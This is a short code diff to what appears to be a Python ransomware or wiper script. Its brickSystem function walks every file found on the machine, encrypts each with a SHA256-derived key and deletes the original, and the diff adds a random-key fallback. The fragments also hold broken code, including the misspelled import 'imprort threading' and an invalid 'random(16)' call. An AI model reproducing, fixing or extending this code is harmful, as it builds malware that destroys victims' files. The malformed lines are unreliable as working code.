@@ -8,7 +8,7 @@ imprort threading
 import itertools
 
 
-sysFiles = [] # all of the files found on the machine.
+ALL_FOUND_FILES = [] # all of the files found on the machine.
 
 # Drive files, used for threading.
 cFiles = []
@@ -71,19 +71,18 @@ def encrypt(key, filename):
 
 
 def brickSystem(key):
-    
-    KEY = key
-   
-    ALL_FILES = sysFiles 
 
-    for target_file in ALL_FILES:
+    if key == "":
+	key = random(16);
+	
+    for target_file in ALL_FOUND_FILES:
         if os.path.basename(target_file).startswith("!Bricked"):
             pass
         elif target_file == os.path.join(os.getcwd(), sys.argv[0]):
             pass
         else:
          
-            encrypt(SHA256.new(KEY).digest(), str(target_file))
+            encrypt(SHA256.new(key).digest(), str(target_file))
             os.remove(target_file)
                 
 
@@ -420,7 +419,7 @@ def Search_Z_Drive(EmptyList):
 
 
 def main():
-    user_key = "EXAMPLE KEY :)" 
+    user_key = "EXAMPLE KEY" 
                     
     discoverFiles() # Find all files   
                     
